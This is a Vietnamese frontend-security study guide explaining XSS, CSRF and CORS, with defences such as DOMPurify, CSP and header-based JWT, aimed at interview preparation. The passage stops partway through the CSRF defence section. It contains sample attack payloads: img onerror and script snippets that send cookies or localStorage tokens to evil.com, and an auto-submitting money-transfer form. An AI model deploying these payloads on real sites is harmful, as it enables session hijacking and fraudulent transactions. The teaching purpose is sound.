# 🛡️ PHÂN TÍCH CHUYÊN SÂU: XSS, CSRF, CORS — Bảo Mật Frontend Toàn Diện

> **Ngày phân tích**: 2026-04-10
> **Mục tiêu**: Hiểu rõ 100% ba mối đe dọa bảo mật lớn nhất ở phía Frontend — XSS, CSRF, CORS — từ lý thuyết gốc đến cách phòng chống thực tế trong dự án Shopee Clone TypeScript
> **Đối tượng**: Frontend Developer 2+ năm kinh nghiệm, chuẩn bị phỏng vấn Senior/Lead về Web Security
> **Tech Stack**: React 19 · TypeScript 5.9 · Vite 7 · Axios · TanStack Query v5 · DOMPurify · Zod v4

---

## 📑 MỤC LỤC

1. [Tổng Quan — Tại Sao Frontend Developer Phải Hiểu Security?](#1-tổng-quan--tại-sao-frontend-developer-phải-hiểu-security)
2. [XSS — Cross-Site Scripting](#2-xss--cross-site-scripting)
   - 2.1 [XSS Là Gì?](#21-xss-là-gì)
   - 2.2 [3 Loại XSS — Stored, Reflected, DOM-based](#22-ba-loại-xss--stored-reflected-dom-based)
   - 2.3 [XSS Trong React — "Tưởng An Toàn Nhưng Chưa Chắc"](#23-xss-trong-react--tưởng-an-toàn-nhưng-chưa-chắc)
   - 2.4 [DOMPurify — Vũ Khí Chính Chống XSS Trong Dự Án Này](#24-dompurify--vũ-khí-chính-chống-xss-trong-dự-án-này)
   - 2.5 [Content Security Policy (CSP) — Lớp Phòng Thủ Cuối](#25-content-security-policy-csp--lớp-phòng-thủ-cuối)
   - 2.6 [Checklist Chống XSS Cho Frontend Developer](#26-checklist-chống-xss-cho-frontend-developer)
3. [CSRF — Cross-Site Request Forgery](#3-csrf--cross-site-request-forgery)
   - 3.1 [CSRF Là Gì?](#31-csrf-là-gì)
   - 3.2 [Luồng Tấn Công CSRF Chi Tiết](#32-luồng-tấn-công-csrf-chi-tiết)
   - 3.3 [Tại Sao Token-based Auth (JWT) Giảm Thiểu CSRF?](#33-tại-sao-token-based-auth-jwt-giảm-thiểu-csrf)
   - 3.4 [Phân Tích HTTP Client Của Dự Án — CSRF Impact](#34-phân-tích-http-client-của-dự-án--csrf-impact)
   - 3.5 [Khi Nào Vẫn Cần Chống CSRF Dù Dùng JWT?](#35-khi-nào-vẫn-cần-chống-csrf-dù-dùng-jwt)
   - 3.6 [Các Chiến Lược Chống CSRF Phổ Biến](#36-các-chiến-lược-chống-csrf-phổ-biến)
4. [CORS — Cross-Origin Resource Sharing](#4-cors--cross-origin-resource-sharing)
   - 4.1 [Same-Origin Policy — Nền Tảng Của Mọi Thứ](#41-same-origin-policy--nền-tảng-của-mọi-thứ)
   - 4.2 [CORS Là Gì? Nó "Mở Khóa" Same-Origin Policy Như Thế Nào?](#42-cors-là-gì-nó-mở-khóa-same-origin-policy-như-thế-nào)
   - 4.3 [Simple Request vs Preflight Request — Khi Nào Browser Gửi OPTIONS?](#43-simple-request-vs-preflight-request--khi-nào-browser-gửi-options)
   - 4.4 [CORS Trong Dự Án Này — Frontend Gọi API Khác Domain](#44-cors-trong-dự-án-này--frontend-gọi-api-khác-domain)
   - 4.5 [withCredentials & Cookie — Mối Liên Hệ CORS + CSRF](#45-withcredentials--cookie--mối-liên-hệ-cors--csrf)
   - 4.6 [CORS Errors Thường Gặp & Cách Debug](#46-cors-errors-thường-gặp--cách-debug)
5. [Mối Liên Hệ Giữa XSS, CSRF, CORS — Bức Tranh Toàn Cảnh](#5-mối-liên-hệ-giữa-xss-csrf-cors--bức-tranh-toàn-cảnh)
6. [Phân Tích Bảo Mật Thực Tế Trong Codebase Shopee Clone](#6-phân-tích-bảo-mật-thực-tế-trong-codebase-shopee-clone)
7. [Câu Hỏi Phỏng Vấn Thường Gặp & Cách Trả Lời](#7-câu-hỏi-phỏng-vấn-thường-gặp--cách-trả-lời)
8. [Tổng Kết & Recommendations](#8-tổng-kết--recommendations)
9. [Tài Liệu Tham Khảo](#9-tài-liệu-tham-khảo)

---

## 1. Tổng Quan — Tại Sao Frontend Developer Phải Hiểu Security?

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                  TẠI SAO FRONTEND PHẢI HIỂU BẢO MẬT?                       │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  🎯 Frontend là "cổng chính" — nơi user nhập dữ liệu, nơi attacker        │
│     inject code, nơi token bị đánh cắp                                      │
│                                                                              │
│  📊 OWASP Top 10 (2021+):                                                   │
│     #1 Broken Access Control                                                 │
│     #3 Injection (bao gồm XSS)                                              │
│     #7 Cross-Site Scripting (riêng biệt)                                    │
│                                                                              │
│  💰 Chi phí thực tế:                                                        │
│     • XSS có thể đánh cắp session → truy cập tài khoản user                │
│     • CSRF có thể thực hiện giao dịch trái phép (chuyển tiền, mua hàng)    │
│     • CORS misconfiguration → leak dữ liệu nhạy cảm sang domain khác       │
│                                                                              │
│  🧑‍💻 Phỏng vấn Senior/Lead:                                                │
│     "Giải thích XSS, CSRF, CORS" → câu hỏi BẮT BUỘC phải trả lời được    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 🔗 Ba khái niệm này liên quan thế nào?

```
  ┌──────────┐
  │  Browser  │  ← Nơi mọi thứ xảy ra
  └────┬─────┘
       │
       ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  Same-Origin Policy (SOP) ── nền tảng bảo mật của browser       │
  │     │                                                            │
  │     ├── CORS: cơ chế "nới lỏng" SOP một cách có kiểm soát      │
  │     │                                                            │
  │     ├── CSRF: tấn công lợi dụng browser tự gửi cookie           │
  │     │         (SOP KHÔNG chặn request, chỉ chặn đọc response)   │
  │     │                                                            │
  │     └── XSS: tấn công inject code VÀO CHÍNH trang web           │
  │              → bypass mọi thứ vì code chạy cùng origin          │
  │                                                                  │
  └──────────────────────────────────────────────────────────────────┘
```

---

## 2. XSS — Cross-Site Scripting

### 2.1 XSS Là Gì?

**XSS (Cross-Site Scripting)** là kỹ thuật tấn công trong đó attacker **inject mã JavaScript độc hại** vào trang web, khiến code đó chạy trong browser của user khác.

```
┌──────────────────────────────────────────────────────────────────────┐
│                   XSS — CROSS-SITE SCRIPTING                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Bản chất: Attacker nhét code JavaScript vào website của bạn         │
│                                                                      │
│  Mục tiêu:                                                           │
│    • Đánh cắp cookie/token → chiếm session user                     │
│    • Keylogging → ghi lại mật khẩu user đang gõ                     │
│    • Redirect → đưa user đến trang giả mạo (phishing)               │
│    • Modify DOM → thay đổi nội dung trang (hiện form giả)           │
│    • Crypto mining → dùng CPU user để đào coin                       │
│                                                                      │
│  Nguy hiểm vì: Code chạy CÙNG ORIGIN với website                    │
│    → Có toàn quyền truy cập DOM, cookies, localStorage, sessionStorage │
│    → Same-Origin Policy KHÔNG bảo vệ được (vì cùng origin)           │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 Ba Loại XSS — Stored, Reflected, DOM-based

#### 🔴 Stored XSS (Persistent XSS) — Nguy hiểm nhất

```
                           STORED XSS FLOW
                           ═══════════════

  Attacker                      Server                     Victim
  ────────                      ──────                     ──────
      │                            │                          │
      │  1. POST comment:          │                          │
      │  "<script>                 │                          │
      │    fetch('evil.com?c='     │                          │
      │    +document.cookie)       │                          │
      │  </script>"               │                          │
      │ ─────────────────────────► │                          │
      │                            │  2. Lưu vào Database    │
      │                            │     (không sanitize)     │
      │                            │                          │
      │                            │  3. Victim mở trang      │
      │                            │ ◄─────────────────────── │
      │                            │                          │
      │                            │  4. Server trả HTML      │
      │                            │     kèm script độc hại   │
      │                            │ ────────────────────────► │
      │                            │                          │
      │                            │  5. Browser thực thi     │
      │                            │     script → gửi cookie  │
      │  6. Attacker nhận cookie   │     đến evil.com         │
      │ ◄─────────────────────────────────────────────────── │
      │                            │                          │
      │  7. Dùng cookie để         │                          │
      │     chiếm tài khoản        │                          │
```

**Ví dụ trong E-commerce**: Attacker viết review sản phẩm chứa script. Mọi user xem review đều bị tấn công.

```html
<!-- Attacker nhập review sản phẩm -->
Sản phẩm rất tốt! 5 sao!
<img src="x" onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('access_token'))">
```

#### 🟠 Reflected XSS — Phổ biến nhất

```
                           REFLECTED XSS FLOW
                           ══════════════════

  Attacker                      Server                     Victim
  ────────                      ──────                     ──────
      │                            │                          │
      │  1. Tạo URL độc hại:      │                          │
      │  shop.com/search?q=       │                          │
      │  <script>alert(1)</script> │                          │
      │                            │                          │
      │  2. Gửi link cho victim    │                          │
      │     (email, chat, social)  │                          │
      │ ─────────────────────────────────────────────────────►│
      │                            │                          │
      │                            │  3. Victim click link    │
      │                            │ ◄─────────────────────── │
      │                            │                          │
      │                            │  4. Server phản hồi:     │
      │                            │  "Kết quả cho:           │
      │                            │   <script>alert(1)       │
      │                            │   </script>"             │
      │                            │ ────────────────────────► │
      │                            │                          │
      │                            │  5. Script thực thi      │
      │                            │     trong browser victim │
```

**Ví dụ**: URL tìm kiếm `https://shopee.com/search?keyword=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`

#### 🟡 DOM-based XSS — Frontend là thủ phạm

Khác biệt lớn nhất: **Server không liên quan**. Code frontend tự lấy dữ liệu từ URL/DOM rồi tự render không an toàn.

```
                           DOM-BASED XSS FLOW
                           ═══════════════════

  Toàn bộ xảy ra trong BROWSER — Server không biết gì

  URL: shop.com/page#<img src=x onerror=alert(1)>

  ┌───────────────────────────────────────────────────────────┐
  │  Browser                                                   │
  │                                                            │
  │  1. JavaScript đọc location.hash                           │
  │     → "#<img src=x onerror=alert(1)>"                      │
  │                                                            │
  │  2. Code frontend KHÔNG SANITIZE:                          │
  │     element.innerHTML = decodeURIComponent(location.hash)   │
  │                                                            │
  │  3. Browser parse HTML → <img> tag được tạo                │
  │     → onerror fires → alert(1) chạy                        │
  │                                                            │
  │  ⚠️ Server log không thấy gì — hash fragment               │
  │     KHÔNG gửi lên server                                   │
  └───────────────────────────────────────────────────────────┘
```

**DOM-based XSS đặc biệt nguy hiểm với SPA (React, Vue, Angular)** vì:
- Routing client-side → URL thay đổi mà không gọi server
- State management phức tạp → nhiều nơi đọc dữ liệu user-controlled
- `innerHTML`, `dangerouslySetInnerHTML` → injection point trực tiếp

#### So sánh 3 loại XSS

| Tiêu chí | Stored XSS | Reflected XSS | DOM-based XSS |
|---|---|---|---|
| **Payload lưu ở đâu?** | Database server | URL (query param) | URL (hash/param) — client-side |
| **Server có liên quan?** | ✅ Có — server lưu + trả về | ✅ Có — server phản hồi payload | ❌ Không — hoàn toàn client |
| **Cần victim click link?** | ❌ Không — ai vào trang cũng bị | ✅ Cần click link chứa payload | ✅ Cần click link chứa payload |
| **Phát hiện bằng WAF?** | ✅ Có thể | ✅ Có thể | ❌ Rất khó — hash không gửi lên server |
| **Mức độ nguy hiểm** | 🔴 Cao nhất | 🟠 Trung bình | 🟡 Cao (khó phát hiện) |
| **Ai chịu trách nhiệm fix?** | Backend + Frontend | Backend + Frontend | **Frontend chủ yếu** |

### 2.3 XSS Trong React — "Tưởng An Toàn Nhưng Chưa Chắc"

#### ✅ React TỰ ĐỘNG escape — đây là lớp bảo vệ mặc định

```tsx
// ✅ AN TOÀN — React tự escape
const userInput = '<script>alert("xss")</script>'
return <div>{userInput}</div>

// React render ra HTML:
// <div>&lt;script&gt;alert("xss")&lt;/script&gt;</div>
// → Browser hiển thị text thuần, KHÔNG thực thi script
```

React chuyển đổi các ký tự đặc biệt:
```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
```

#### ❌ Nhưng React KHÔNG bảo vệ trong những trường hợp sau:

**Trường hợp 1: `dangerouslySetInnerHTML` — Cửa sau XSS**

```tsx
// ❌ NGUY HIỂM — bypass hoàn toàn React escaping
const userContent = '<img src=x onerror="alert(document.cookie)">'
return <div dangerouslySetInnerHTML={{ __html: userContent }} />
// → Script chạy! Cookie bị lộ!
```

**Trường hợp 2: `href` với `javascript:` protocol**

```tsx
// ❌ NGUY HIỂM — React KHÔNG chặn javascript: protocol
const userUrl = 'javascript:alert(document.cookie)'
return <a href={userUrl}>Click me</a>
// → Khi user click, JavaScript chạy!

// React 16.9+ có warning nhưng KHÔNG chặn hoàn toàn ở mọi version
```

**Trường hợp 3: Render HTML từ Markdown/Rich text**

```tsx
// ❌ NGUY HIỂM — nếu markdown parser không sanitize
import { marked } from 'marked'
const markdown = '![alt](x" onerror="alert(1))'
return <div dangerouslySetInnerHTML={{ __html: marked(markdown) }} />
```

**Trường hợp 4: Server-Side Rendering (SSR) — hydration mismatch**

```tsx
// ❌ NGUY HIỂM — SSR render trực tiếp user input vào HTML
// Server response: <div>User's "name" is <script>alert(1)</script></div>
// → Script chạy TRƯỚC khi React hydrate
```

**Trường hợp 5: Dynamic attribute injection**

```tsx
// ❌ NGUY HIỂM — spread props từ user-controlled object
const userProps = { onError: 'alert(1)' } // từ query param hoặc API
return <img {...userProps} src="avatar.jpg" />
```

### 2.4 DOMPurify — Vũ Khí Chính Chống XSS Trong Dự Án Này

#### Cách dự án Shopee Clone sử dụng DOMPurify

```
  src/pages/ProductDetail/ProductDetail.tsx (line 2, 359-362)
  ═══════════════════════════════════════════════════════════

  import DOMPurify from 'dompurify'    ← Import thư viện

  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(product.description)
    }}                                 ← Sanitize TRƯỚC khi render
  />
```

#### DOMPurify làm gì bên trong?

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   DOMPurify.sanitize() — Cơ Chế Hoạt Động              │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  INPUT (HTML không an toàn):                                             │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │ <div>                                                              │  │
│  │   <p>Sản phẩm chất lượng cao</p>                                  │  │
│  │   <script>fetch('evil.com?t='+localStorage.access_token)</script>  │  │
│  │   <img src="product.jpg" onerror="alert('XSS')">                  │  │
│  │   <a href="javascript:alert(1)">Click here</a>                    │  │
│  │   <style>body { display:none }</style>                             │  │
│  │ </div>                                                             │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                              │                                           │
│                              ▼                                           │
│  ┌──────────────────────── SANITIZE ──────────────────────────────────┐  │
│  │  1. Parse HTML thành DOM tree (dùng browser's DOMParser)           │  │
│  │  2. Walk qua TỪNG node trong tree                                  │  │
│  │  3. Check WHITELIST:                                               │  │
│  │     • Allowed tags: <div>, <p>, <span>, <img>, <a>, <b>, ...      │  │
│  │     • Allowed attributes: src, href, class, style, ...            │  │
│  │  4. REMOVE mọi thứ KHÔNG nằm trong whitelist:                     │  │
│  │     ✗ <script> tags                                                │  │
│  │     ✗ Event handlers (onclick, onerror, onload, ...)              │  │
│  │     ✗ javascript: URLs                                             │  │
│  │     ✗ data: URLs chứa script                                      │  │
│  │     ✗ <style> tags (nếu không cho phép)                           │  │
│  │  5. Serialize DOM tree trở lại thành HTML string                   │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                              │                                           │
│                              ▼                                           │
│  OUTPUT (HTML an toàn):                                                  │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │ <div>                                                              │  │
│  │   <p>Sản phẩm chất lượng cao</p>                                  │  │
│  │   <img src="product.jpg">                      ← onerror bị xóa  │  │
│  │   <a>Click here</a>                   ← javascript: href bị xóa  │  │
│  │ </div>                                                             │  │
│  │                                                                    │  │
│  │ ✗ <script> bị xóa hoàn toàn                                       │  │
│  │ ✗ <style> bị xóa                                                  │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

#### DOMPurify Configuration Nâng Cao

```typescript
// Cấu hình cơ bản (dự án hiện tại dùng)
DOMPurify.sanitize(dirty)

// Cấu hình strict — chỉ cho phép text formatting
DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['class']
})

// Cấu hình cho product description — cần giữ hình ảnh + tables
DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li',
                 'table', 'thead', 'tbody', 'tr', 'td', 'th',
                 'img', 'a', 'h1', 'h2', 'h3', 'h4', 'div', 'span'],
  ALLOWED_ATTR: ['class', 'src', 'alt', 'href', 'target', 'rel', 'width', 'height'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'input', 'textarea'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover']
})

// Hook — custom processing
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Force all links to open in new tab + prevent tabnabbing
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
  // Force all images to use https
  if (node.tagName === 'IMG') {
    const src = node.getAttribute('src') || ''
    if (src.startsWith('http:')) {
      node.setAttribute('src', src.replace('http:', 'https:'))
    }
  }
})
```

#### Tại sao DOMPurify tốt hơn tự viết sanitizer?

```
┌─────────────────────────┬──────────────────────────────────────────────┐
│  Tự viết (regex-based)  │  DOMPurify                                  │
├─────────────────────────┼──────────────────────────────────────────────┤
│  ❌ str.replace(         │  ✅ Parse thành DOM tree thực sự            │
│     /<script>/g, '')     │     → Hiểu HTML context                     │
│  ❌ Bypass dễ:           │  ✅ Xử lý mọi edge case:                   │
│     <scr<script>ipt>     │     • Nested tags                           │
│     <SCRIPT>             │     • Encoding tricks                       │
│     <script >            │     • Mutation XSS                          │
│  ❌ Không handle         │  ✅ 8+ năm battle-tested                    │
│     encoding/entities    │     600+ test cases                         │
│  ❌ False positives      │  ✅ Maintained bởi security researchers     │
│     hoặc false negatives │     (Cure53)                                │
└─────────────────────────┴──────────────────────────────────────────────┘
```

### 2.5 Content Security Policy (CSP) — Lớp Phòng Thủ Cuối

CSP là HTTP header báo cho browser biết **sources nào được phép** load resources. Ngay cả khi attacker inject được script, CSP có thể **chặn script đó chạy**.

```
┌──────────────────────────────────────────────────────────────────────────┐
│                  CSP — CONTENT SECURITY POLICY                           │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Cơ chế: Server gửi header → Browser enforce                            │
│                                                                          │
│  Content-Security-Policy:                                                │
│    default-src 'self';                    ← Chỉ load từ cùng origin     │
│    script-src 'self' 'nonce-abc123';      ← Script phải có nonce        │
│    style-src 'self' 'unsafe-inline';      ← Cho phép inline styles      │
│    img-src 'self' https://cdn.shopee.com; ← Images từ CDN               │
│    connect-src 'self' https://api.shopee.com; ← API calls               │
│    frame-src 'none';                      ← Không cho phép iframe       │
│    object-src 'none';                     ← Không cho phép Flash/Java   │
│                                                                          │
│  Khi attacker inject <script>alert(1)</script>:                          │
│    → Browser check: script này có nonce không? → KHÔNG → CHẶN           │
│    → Console: "Refused to execute inline script because it violates      │
│       the following CSP directive: script-src 'self' 'nonce-abc123'"     │
│                                                                          │
│  ⚠️ Dự án này dùng react-helmet-async nhưng CSP thường được set         │
│     ở server level (Nginx/Express), KHÔNG phải qua <meta> tag           │
│     (meta tag CSP bị hạn chế: không hỗ trợ frame-ancestors, ...)       │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

#### CSP Levels

```
  Level 1: Whitelist-based
  ─────────────────────────
  script-src 'self' https://trusted-cdn.com

  Level 2: Nonce-based (recommended)
  ────────────────────────────────────
  script-src 'nonce-randomValue123'

  <script nonce="randomValue123">
    // Được phép chạy vì có đúng nonce
  </script>

  <script>
    alert('XSS') // BỊ CHẶN — không có nonce
  </script>

  Level 3: Strict-dynamic
  ─────────────────────────
  script-src 'strict-dynamic' 'nonce-abc'
  → Script có nonce được phép load thêm script khác
  → Phù hợp với SPA (React lazy loading chunks)
```

### 2.6 Checklist Chống XSS Cho Frontend Developer

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   CHECKLIST CHỐNG XSS — FRONTEND                         │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ MẶC ĐỊNH AN TOÀN                                                    │
│  ────────────────────                                                    │
│  □ Dùng JSX {variable} thay vì innerHTML — React auto-escape            │
│  □ KHÔNG dùng dangerouslySetInnerHTML trừ khi BẮT BUỘC                  │
│  □ Nếu PHẢI dùng dangerouslySetInnerHTML → DOMPurify.sanitize()         │
│                                                                          │
│  ✅ INPUT VALIDATION                                                     │
│  ────────────────────                                                    │
│  □ Validate + sanitize ở cả CLIENT và SERVER                            │
│  □ Dùng Zod schema cho input validation (dự án này đã làm)              │
│  □ Whitelist characters cho từng loại input                              │
│     (email → email regex, tên → chữ cái + số + dấu)                    │
│                                                                          │
│  ✅ URL HANDLING                                                         │
│  ────────────────────                                                    │
│  □ Validate URL trước khi dùng làm href                                 │
│  □ Chặn javascript: protocol, data: protocol                            │
│  □ target="_blank" → thêm rel="noopener noreferrer"                     │
│                                                                          │
│  ✅ HTTP HEADERS (phối hợp backend)                                      │
│  ────────────────────                                                    │
│  □ Content-Security-Policy header                                        │
│  □ X-Content-Type-Options: nosniff                                       │
│  □ X-Frame-Options: DENY (hoặc SAMEORIGIN)                              │
│  □ X-XSS-Protection: 0 (deprecated, dùng CSP thay thế)                  │
│                                                                          │
│  ✅ THIRD-PARTY                                                          │
│  ────────────────────                                                    │
│  □ Audit npm packages (npm audit, Snyk)                                  │
│  □ Subresource Integrity (SRI) cho CDN scripts                          │
│  □ Tránh eval(), Function(), setTimeout(string), setInterval(string)    │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 3. CSRF — Cross-Site Request Forgery

### 3.1 CSRF Là Gì?

**CSRF (Cross-Site Request Forgery)** — "Giả mạo request từ site khác". Attacker lừa browser của victim gửi request đến server mà victim đã đăng nhập, **sử dụng chính session/cookie của victim**.

```
┌──────────────────────────────────────────────────────────────────────┐
│                 CSRF — CROSS-SITE REQUEST FORGERY                    │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Bản chất: KHÔNG inject code — mà LỢI DỤNG browser tự gửi cookie   │
│                                                                      │
│  Điều kiện để CSRF hoạt động:                                        │
│    1. Victim đã đăng nhập vào target site (có session cookie)        │
│    2. Target site dùng cookie-based authentication                   │
│    3. Attacker biết format của request (URL, params)                 │
│    4. Server không verify request có phải từ legitimate source       │
│                                                                      │
│  Khác biệt quan trọng với XSS:                                      │
│    • XSS: Attacker INJECT CODE vào website → code chạy cùng origin  │
│    • CSRF: Attacker KHÔNG inject code — chỉ tạo request GIẢ         │
│           từ website KHÁC → browser tự gửi cookie kèm theo          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### 3.2 Luồng Tấn Công CSRF Chi Tiết

```
                           CSRF ATTACK FLOW
                           ════════════════

  Victim Browser             shopee.com (Target)           evil.com (Attacker)
  ──────────────             ──────────────────           ──────────────────
       │                            │                            │
       │  1. Login vào Shopee       │                            │
       │ ─────────────────────────► │                            │
       │                            │                            │
       │  2. Server set cookie:     │                            │
       │  Set-Cookie: session=abc   │                            │
       │ ◄───────────────────────── │                            │
       │                            │                            │
       │  [Cookie lưu trong browser]│                            │
       │                            │                            │
       │  3. Victim vào evil.com    │                            │
       │     (click link trong      │                            │
       │      email/chat/social)    │                            │
       │ ──────────────────────────────────────────────────────► │
       │                            │                            │
       │  4. evil.com trả về HTML:  │                            │
       │  <form action="shopee.com/api/transfer" method="POST">  │
       │    <input name="to" value="attacker_account">           │
       │    <input name="amount" value="1000000">                │
       │  </form>                   │                            │
       │  <script>                  │                            │
       │    document.forms[0].submit()                           │
       │  </script>                 │                            │
       │ ◄────────────────────────────────────────────────────── │
       │                            │                            │
       │  5. Browser TỰ ĐỘNG gửi   │                            │
       │     request đến shopee.com │                            │
       │     KÈM THEO cookie=abc   │                            │
       │ ─────────────────────────► │                            │
       │                            │                            │
       │  6. Server thấy cookie     │                            │
       │     hợp lệ → thực hiện    │                            │
       │     chuyển tiền!           │                            │
       │                            │                            │
       │  ⚠️ Server KHÔNG BIẾT     │                            │
       │     request này đến từ     │                            │
       │     evil.com chứ không     │                            │
       │     phải từ shopee.com     │                            │
```

### 3.3 Tại Sao Token-based Auth (JWT) Giảm Thiểu CSRF?

```
┌──────────────────────────────────────────────────────────────────────────┐
│             JWT vs Cookie-based Auth — CSRF Perspective                   │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Cookie-based (dễ bị CSRF):                                             │
│  ────────────────────────────                                            │
│  Browser TỰ ĐỘNG gửi cookie trong MỌI request đến domain đó             │
│  → Attacker tạo form/fetch trên evil.com                                 │
│  → Browser gửi request kèm cookie → Server chấp nhận                    │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────┐             │
│  │ evil.com → POST shopee.com/api/buy                      │             │
│  │ Cookie: session=abc  ← Browser TỰ ĐỘNG gắn             │             │
│  │ Body: { product: "iphone", qty: 100 }                   │             │
│  │                                                          │             │
│  │ → Server: cookie hợp lệ → THỰC HIỆN đơn hàng ❌        │             │
│  └─────────────────────────────────────────────────────────┘             │
│                                                                          │
│  Token-based JWT (chống CSRF tự nhiên):                                  │
│  ──────────────────────────────────────                                   │
│  Token lưu trong localStorage/memory → JavaScript phải đọc + gắn        │
│  vào header MANUALLY → evil.com KHÔNG THỂ đọc localStorage của          │
│  shopee.com (Same-Origin Policy chặn)                                    │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────┐             │
│  │ evil.com → POST shopee.com/api/buy                      │             │
│  │ Authorization: ???  ← evil.com KHÔNG CÓ token           │             │
│  │                       KHÔNG THỂ đọc localStorage        │             │
│  │                       của shopee.com                     │             │
│  │                                                          │             │
│  │ → Server: không có token → REJECT ✅                    │             │
│  └─────────────────────────────────────────────────────────┘             │
│                                                                          │
│  ⚠️ NHƯNG: Nếu JWT lưu trong cookie → vẫn bị CSRF!                     │
│     Chỉ an toàn khi JWT lưu trong localStorage/memory + gửi qua header  │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 3.4 Phân Tích HTTP Client Của Dự Án — CSRF Impact

```
  src/utils/http.ts — HTTP Client Class
  ══════════════════════════════════════

  Cách dự án này xử lý authentication:
```

```typescript
// src/utils/http.ts (line 38-57)
export class Http {
  private accessToken: string
  private refreshToken: string

  constructor() {
    // Token lưu trong MEMORY (RAM) + localStorage
    this.accessToken = getAccessTokenFromLS()    // ← localStorage
    this.refreshToken = getRefreshTokenFromLS()  // ← localStorage

    this.instance = axios.create({
      baseURL: config.baseUrl,
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
      // withCredentials: true    ← ĐÃ BỊ COMMENT OUT — không gửi cookie
    })
  }
}

// src/utils/http.ts (line 58-65) — Request interceptor
this.instance.interceptors.request.use((config) => {
  if (this.accessToken && config.headers) {
    config.headers.authorization = this.accessToken  // ← Gửi token qua HEADER
    return config
  }
  return config
})
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│            PHÂN TÍCH CSRF RISK CỦA DỰ ÁN NÀY                           │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ Token lưu trong localStorage + RAM (this.accessToken)                │
│     → evil.com KHÔNG THỂ đọc localStorage của shopee domain             │
│     → CSRF KHÔNG thực hiện được                                         │
│                                                                          │
│  ✅ Token gửi qua Authorization header (KHÔNG phải cookie)              │
│     → Browser KHÔNG TỰ ĐỘNG gửi header này                             │
│     → evil.com không thể forge request có Authorization header           │
│                                                                          │
│  ✅ withCredentials: true đã bị COMMENT OUT                              │
│     → Browser KHÔNG gửi cookie cross-origin                              │
│     → Thêm một lớp bảo vệ nữa                                          │
│                                                                          │
│  🟡 Trade-off: localStorage có thể bị XSS đọc                           │
│     → Nếu có XSS vulnerability, attacker đọc được token                 │
│     → Đó là lý do chống XSS là ưu tiên SỐ 1                            │
│                                                                          │
│  Kết luận: Dự án này IMMUNE với CSRF nhờ dùng JWT + header-based auth   │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 3.5 Khi Nào Vẫn Cần Chống CSRF Dù Dùng JWT?

```
┌──────────────────────────────────────────────────────────────────────────┐
│                VẪN CẦN CSRF PROTECTION KHI:                              │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. JWT lưu trong httpOnly cookie (pattern phổ biến ở production)       │
│     → Browser tự gửi cookie → CSRF vẫn hoạt động                       │
│     → Cần CSRF token hoặc SameSite cookie                               │
│                                                                          │
│  2. Session-based auth (traditional server-rendered apps)                │
│     → Session ID trong cookie → classic CSRF target                      │
│                                                                          │
│  3. Hybrid auth (JWT trong cookie + CSRF token)                         │
│     → Nhiều enterprise apps dùng pattern này cho bảo mật tối đa         │
│                                                                          │
│  4. API có side effects quan trọng (payment, transfer, delete)          │
│     → Defense in depth — thêm CSRF token dù đã dùng JWT header         │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 3.6 Các Chiến Lược Chống CSRF Phổ Biến

#### 1. Synchronizer Token Pattern (Classic)

```
  Server                              Browser
  ──────                              ──────
    │                                    │
    │  1. Render form + hidden token     │
    │  <form>                            │
    │    <input type="hidden"            │
    │      name="_csrf"                  │
    │      value="random-token-xyz">     │
    │  </form>                           │
    │ ──────────────────────────────────►│
    │                                    │
    │  2. Submit form + token            │
    │  POST /api/buy                     │
    │  Cookie: session=abc               │
    │  Body: { _csrf: "random-token-xyz",│
    │          product: "iphone" }       │
    │◄──────────────────────────────────│
    │                                    │
    │  3. Server verify:                 │
    │  session.csrfToken === body._csrf? │
    │  → YES → process request          │
    │                                    │
    │  ⚠️ evil.com KHÔNG THỂ biết       │
    │     giá trị _csrf vì CORS chặn    │
    │     đọc response từ shopee.com    │
```

#### 2. Double Submit Cookie Pattern

```typescript
// Frontend gửi CSRF token qua BOTH cookie VÀ header
